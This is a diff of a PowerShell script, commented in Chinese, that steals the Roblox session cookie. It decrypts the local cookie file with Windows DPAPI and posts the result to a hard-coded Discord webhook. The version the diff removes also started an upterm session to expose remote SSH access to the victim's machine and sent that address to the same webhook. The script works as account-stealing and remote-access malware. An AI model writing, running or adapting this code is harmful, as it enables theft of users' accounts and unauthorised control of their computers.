@@ -1,25 +1,28 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
-# 0.5 取得token
+# 1. 取得token
 $p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; if(Test-Path $p){ [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); $s=[Text.Encoding]::UTF8.GetString($d); if($s -match '(_\|WARNING.*?)(;|$)'){$cookie=$matches[1]; $cookie} }else{"Roblox Not Found"}
 
-:: 1. 設定 Webhook URL
-set "WEBHOOK=https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"
+# 2. 定義 Webhook URL
+$uri = "https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"
 
-:: 2. Base64 編碼的 JSON 模板 (內含標題、顏色、Fields 與 Footer)
-set "B64=ewoiZW1iZWRzIjogWwogICAgewogICAgICAgICJ0aXRsZSI6ICLmlrAgU1NIIOWPr+mnreWFpSIsCiAgICAgICAgImNvbG9yIjogMTY3MTE2ODAsCiAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIm5hbWUiOiAi542o54m5VVVJRCIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiAiYGBge3V1aWR9YGBgIiwKICAgICAgICAgICAgICAgICJpbmxpbmUiOiB0cnVlCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIuWPr+mAo+e3mlNTSCIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiAiYGBge3NzaH1gYGAiLAogICAgICAgICAgICAgICAgImlubGluZSI6IGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICJ0ZXh0IjogIjog5oiR5L6G5ris6Kmm5q2kc3No5piv5ZCm5Y+v55SoIiwKICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMTQ5NDc1MzM5NjQ4MDI4MjcyNC9lM2U3NDQzMWZmNzJiOGQ0NjA3N2UwZDI0OTJjNzBkMy5wbmc/c2l6ZT0xMDI0IgogICAgICAgIH0KICAgIH0KXQp9"
+# 🔓 Base64（你直接貼上）
+$embedBase64 = "eyJ0aXRsZSI6ICLmlrDkuIDmlrByb2Jsb3ggY29va2ll5o6l5pS2IiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul5L2/55SoIn19"
 
-:: 3. 執行 PowerShell 處理邏輯
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "$uuid = [guid]::NewGuid().ToString(); ^
-    $jsonTemplate = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%B64%')); ^
-    upterm host --accept --skip-host-key-check 2>&1 | ForEach-Object { ^
-        Write-Host $_; ^
-        if ($_ -match 'ssh\s+\S+@\S+') { ^
-            $sshAddr = $Matches[0]; ^
-            $payload = $jsonTemplate.Replace('{uuid}', $uuid).Replace('{ssh}', $sshAddr); ^
-            $bytePayload = [Text.Encoding]::UTF8.GetBytes($payload); ^
-            Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $bytePayload -ContentType 'application/json; charset=utf-8'; ^
-            Write-Host '>>> Discord 通知已發送'; ^
-        } ^
-    }"
+# 解密
+$decodedJson = [System.Text.Encoding]::UTF8.GetString(
+    [Convert]::FromBase64String($embedBase64)
+)
+
+# 轉物件
+$embed = $decodedJson | ConvertFrom-Json
+
+# 組 payload
+$payload = @{
+    embeds = @($embed)
+}
+
+# 發送
+Invoke-RestMethod -Uri $uri -Method Post `
+    -Body ($payload | ConvertTo-Json -Depth 10) `
+    -ContentType "application/json; charset=utf-8"
